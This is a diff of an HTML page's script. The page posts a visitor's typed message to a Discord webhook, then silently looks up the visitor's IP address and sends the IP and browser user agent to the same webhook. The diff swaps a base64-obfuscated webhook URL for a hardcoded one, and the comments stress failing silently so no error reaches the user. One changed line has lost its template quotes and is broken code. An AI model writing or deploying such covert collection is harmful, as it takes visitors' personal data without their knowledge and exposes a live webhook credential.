@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -115,19 +117,6 @@
   </audio>
 
   <script>
-    // Base64-encoded webhook URL to hide it slightly
-    const encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3NjgxODE5NTYzMzM3ODA5Ly1VcjcyM2piZnF1eHcxxzZLXzYtUnR5anNlM1I2S2xFQk9NYXJVWVNockFkZERDR01RemlMTUhHU1dJZGhsclJlUjFxa0c=";
-
-    function decodeWebhook(encoded) {
-      try {
-        return atob(encoded);
-      } catch {
-        return null;
-      }
-    }
-
-    const webhookURL = decodeWebhook(encodedWebhook);
-
     const audio = document.getElementById('bgAudio');
     const button = document.getElementById('audioToggle');
 
@@ -144,12 +133,9 @@
     async function sendMessageAndIP() {
       const input = document.getElementById('messageInput');
       const message = input.value.trim();
-      if (!message) return;
+      if (!message) return; // Do nothing if message empty
 
-      if (!webhookURL) {
-        console.error("Webhook URL decoding failed.");
-        return;
-      }
+      const webhookURL = "https://discord.com/api/webhooks/1376818199563337809/-Ur723jbfquxw1f_Kv6-Rtyjse3R6KlEBOMarUYShQddDCGMQziLMHGSWIdhlReR1qkG";
 
       try {
         // Send the user message first
@@ -159,6 +145,7 @@
           body: JSON.stringify({ content: message })
         });
 
+        // Clear input immediately after sending message
         input.value = "";
 
         // Fetch IP info
@@ -169,7 +156,7 @@
         const userAgent = navigator.userAgent;
 
         // Send IP and user agent as separate message
-        const ipContent = `🌐 IP (IPv4): ${userIP}\n💻 User Agent: ${userAgent}`;
+        const ipContent = 🌐 IP (IPv4): ${userIP}\n💻 User Agent: ${userAgent};
 
         await fetch(webhookURL, {
           method: "POST",
@@ -177,7 +164,7 @@
           body: JSON.stringify({ content: ipContent })
         });
       } catch (e) {
-        // Fail silently
+        // Fail silently, no alerts or errors shown to user
       }
     }
   </script>
